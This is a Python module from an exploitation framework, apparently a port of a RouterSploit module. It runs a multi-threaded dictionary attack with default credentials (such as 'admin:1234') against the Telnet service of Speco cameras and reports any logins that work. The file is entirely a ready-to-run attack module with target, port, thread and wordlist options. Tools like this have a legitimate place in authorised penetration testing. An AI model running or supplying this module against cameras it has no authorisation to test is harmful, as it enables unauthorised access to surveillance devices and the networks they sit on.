# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    """Speco Camera — Default Telnet Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Speco Camera Default Telnet Creds",
        "description": (
            "Module performs dictionary attack with default credentials against Speco Camera Telnet service. "
            "If valid credentials are found, they are displayed to the user."
        ),
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",
            "André Henrique (@mrhenrike) — EmbedXPL-Forge port",
        ),
        "devices": (
            "Speco Camera",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:1234", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")
